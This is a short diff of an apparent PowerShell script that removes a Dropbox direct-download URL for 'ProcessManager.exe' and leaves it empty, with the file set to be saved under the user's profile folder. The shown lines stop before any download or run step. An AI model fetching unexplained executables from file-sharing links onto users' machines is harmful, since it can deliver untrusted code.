@@ -2,7 +2,7 @@
 $userPath = $env:USERPROFILE
 
 # Download URL
-$url = "https://www.dropbox.com/scl/fi/4dt2zgwyc195k7mshy7vq/ProcessManager.exe?rlkey=1lnatcvluoj4w2nyz4u70ubt2&st=40aaqout&dl=1"
+$url = ""
 
 # Destination file path
 $destination = Join-Path -Path $userPath -ChildPath "ProcessManager.exe"
